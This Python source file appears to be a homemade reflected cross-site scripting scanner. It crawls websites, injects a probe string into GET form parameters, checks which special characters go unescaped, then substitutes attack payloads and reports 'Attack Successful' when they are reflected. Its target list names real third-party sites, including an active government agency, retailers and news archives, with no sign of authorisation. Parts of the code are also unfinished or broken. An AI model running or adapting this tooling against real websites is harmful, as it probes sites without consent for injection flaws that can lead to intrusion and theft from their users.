
import os 
import re
import requests 
from bs4 import BeautifulSoup

from WebRequest import web_request
from WriteTextFile import write_text_file
from RegularExpression import regular_expression
from FindContexts import find_contexts
from SearchBar import search_payload
from PostLinks import post_links 
from ContextEncoding import context_encoding
from AttackMethodology import attack_methodology
# from WriteExcelFile import write_excel_file


class main_class:
    url = ''
    web = ''
    base = ''
    links = [] 
    website = []
    source = ''

    def __init__(self,url):
        self.base = self.find_base_url(url)

#   Do we still need this function ... let's check it later and then replace it or delete it.
    def start(self,url):
        self.web = web_request(url,'GET')
        self.base = self.find_base_url(url)
        self.source = self.get_source()
        self.website = self.get_links()
        return self.website
    
    def set_website(self,links):
        self.website = links.copy() 

    def display_links(self):
        count = 0
        for link in self.links: 
            count+=1
            print('[', count, ']  ', link)
        print( 'Number of Links ', len(self.links) )

    def get_source(self,url):
        w = web_request(url,'GET')
        s1 = w.open_request()
        s2 = w.openurl()
        if len(s1) > len(s2): source = s1 
        else:   source = s2
        return source

    def get_links(self):
        links = []
        soup = BeautifulSoup(self.source,features="lxml")
        tags = soup.find_all('a', href=True)
        for tag in tags:    
            if self.valid_link(tag['href'],links):    links.append(tag['href'])
        # print(links)
        return links

    def valid_link(self,link,links):
        if str(link).__contains__(self.base):  
            if link not in links:  return True
        else:   return False
    
    def find_base_url(self,link):
        exp = re.compile(r'(?!\w)\.?[\.\w]+')
        # print(link)
        part = exp.findall(link)
        print(part)
        base = part[0]
        # print('Base Url ', base)
        return base

    def set_base_url(self,url):
        self.base = url 

    def bfs_crawling(self,index, website):
        count = index
        self.links = website.copy()
        print('\n\t\t WE ARE FETCHING LINKS \n\n')
        for i in range(index, len(website) ):
            count+=1
            self.url = website[i]
            print(' LINK  [' , count ,']  =>  ' ,self.url)

            self.web = web_request(self.url,'GET')
            self.base = self.find_base_url(self.url)
            self.source = self.get_source(self.url)
            bfs_links = self.get_links()

            for new_link in bfs_links: 
                if new_link not in self.links:
                    self.links.append(new_link)

        return count , self.links

#-------------------------------------------------------------------------------------------------------------
#       End of Class: main_class
#-------------------------------------------------------------------------------------------------------------

def remove_duplicate_get_urls(get_urls):
    unique_get_urls = [] 
    # print('Removing Duplicates...')
    for x in get_urls:
        # Removing Duplicates
        if x not in unique_get_urls: unique_get_urls.append(x)  
    return unique_get_urls

def collect_data():
    search = search_payload()
    get_urls = []    # it is the list in which GET <form> links are added / concatenated
    links_count = 0
    
    # we have 2 links
    for link in links:  #links contains all the references/links
        links_count += 1
        print( '\n[', links_count , '/',  len(links), '] => ', link, end="")
        if not link == [] and link.__contains__('http'):   
            # generates links of every <form ... method="get">. 
            # We receive a list of links. 
            get_urls = search.start_search(link) 
        else: 
            continue

        unique_get_urls = remove_duplicate_get_urls(get_urls)
        print('\nUnique GET URLs:[',len(unique_get_urls), ']\n', unique_get_urls)
        collect_response_data(link, unique_get_urls)

def collect_response_data(link, unique_get_urls): # add payload in params..?
    find = find_contexts()
    CE = context_encoding()
    AM = attack_methodology()
    count = 0
    attack_urls = []

    # Single Text File Containing Both GET and POST Form Response.
    Text = write_text_file(link, payload)

    # Collecting Context Data of  <GET Forms>
    # print( 'Unique GET URLs [', len(unique_get_urls) , ']\n', unique_get_urls ,'\n' )
    for u in unique_get_urls:
        count+=1
        if u: url = u #+ payload     # if url is not Empty then Attach the Payload
        else: continue
        if url.__contains__('http'):    # Checking for a Valid Url
            print('[', count , '/', len(unique_get_urls), ']', 'Checking Encoding =>',  url )
            
            # Retrieving source code of the webpage
            source = m.get_source(url) 
    
            # Finding All Contexts
            attrs, htmls, scripts, urls, same_attrs, same_htmls, same_scripts, same_urls = find.find_context(url, payload, str(source) )
            # Writing Contexts to Text File
            Text.write_contexts(url, attrs, htmls, scripts, urls, same_attrs, same_htmls, same_scripts, same_urls)

            # CE.display(attrs)
            # This function returns true for the encoding or escaping of special chars.
            presence, double_quotes, single_quotes, lessthan_sign, forward_slash = CE.encoding_analyzer(attrs)
            print('ATTR\t = ', presence, double_quotes, single_quotes, lessthan_sign, forward_slash )
            Text.write_encoding( None, presence, double_quotes, single_quotes, lessthan_sign, forward_slash)
            Text.write_encoding('ATTR', presence, double_quotes, single_quotes, lessthan_sign, forward_slash)

            # CE.display(htmls)
            # presence, double_quotes, single_quotes, lessthan_sign, forward_slash = CE.encoding_analyzer(htmls)
            # print('HTML\t = ', presence, double_quotes, single_quotes, lessthan_sign, forward_slash )
            # CE.display(scripts)
            # presence, double_quotes, single_quotes, lessthan_sign, forward_slash = CE.encoding_analyzer(scripts)
            # print('SCRIPT\t = ', presence, double_quotes, single_quotes, lessthan_sign, forward_slash )
            # CE.display(urls)
            # presence, double_quotes, single_quotes, lessthan_sign, forward_slash = CE.encoding_analyzer(urls)
            # print('URL\t = ', presence, double_quotes, single_quotes, lessthan_sign, forward_slash )
            
            attack_payloads = []
            tag, attack_payloads = AM.get_attack_payload('attr', presence, double_quotes, single_quotes, lessthan_sign, forward_slash )
            print('Attack Payloads: ', attack_payloads)
            
            if tag:
                for attack in attack_payloads:
                    url = url.replace(payload, attack)
                    print('\n Attack Url:\t', url)
                    data = m.get_source(url)
                    if( str(data).__contains__(attack)):
                        print('\n\n \t Attack Successful with Payload: ', attack, '\n\n')
                    R = regular_expression(data)
                    R.set_payload(attack)
                    print(R.RegExpSameAttribute())

            pass
    # Collecting Response Data of  <Post Forms>
    postlink = []
    postlink.append(link)
    # link, posturl, r, presence = post.collect_data(postlink)
    # Writing Response of Post Forms
    # Text.write_postforms( posturl, r, presence)

    # Excel = write_excel_file(url,'NewDataSheet.xlsx', payload)
    # Excel.write_contexts(attrs, htmls, scripts, urls, same_attrs , same_htmls, same_scripts, same_urls)


if __name__ == "__main__":
    payload = '"' + "xyz'yxz</zxy"
    post = post_links()

    links = []
    # links += ['https://www.moma.org/']      # 376 Unique Links in this website with 2 level bfs...  
    # links += ['https://www.britannica.com/explore/yearinreview/']
    # links += ['https://www.roomandboard.com/']
    # links += ['https://www.harryanddavid.com/']
    # links += ['https://www.keh.com/']
    # links += ['https://www.cat.com/en_US']
    # links += ['https://www.1000bulbs.com/']
    # links += ['https://www.discountpartysupplies.com/']
    # links += ['https://www.kirklands.com/']
    # links += ['https://www.africanews.com/']
    # links += ['https://www.ars.usda.gov/']      #200
    # links += ['https://www.iita.org/']
    # links += ['https://www.agricultureinformation.com/forums/']
    # links += ['https://www.ces.ncsu.edu/']
    # links += ['https://www.acehardware.com']
    # links += ['https://www.vanhalenstore.com/']
    # links += ['http://www.lllreptile.com/']
    links += ['http://drudgereportarchives.com/']
    # links += ['https://www.zentechnologies.com/']
    # links += ['https://ifu-institut.at/']


    # links = post.read_excel()
    m = main_class(links[0])

    # Collecting all the links of a web page (these are the references of webpages)
    index = 0
    for bfs_levels in range(0):
        index, links = m.bfs_crawling(index,links)      

    # collecting links from an Excel File ('data.xlsx')    
    collect_data()  

    # Check Post links here
    # post.collect_data(links)
    
print('\n----------------------   PROGRAM     ENDED   -----------------------------\n')

"""   <--   Suggested Algorithms -->

Attack Urls: 
1. replace the old payload with the NEW payloads one by one. 
2. So, in this way they'll be a value to the GET Param that caused that vulnerability.  
3. Get their source. 
4. find Same Context Appearance. if exact same Appearance is detected then [ Attack is successful..!! ]
5. Move On to Next Attack Url 

"""

"""  <===     Upgrades  ===>
1. I've added headers {} in the open_request() function of the WebRequest Class


"""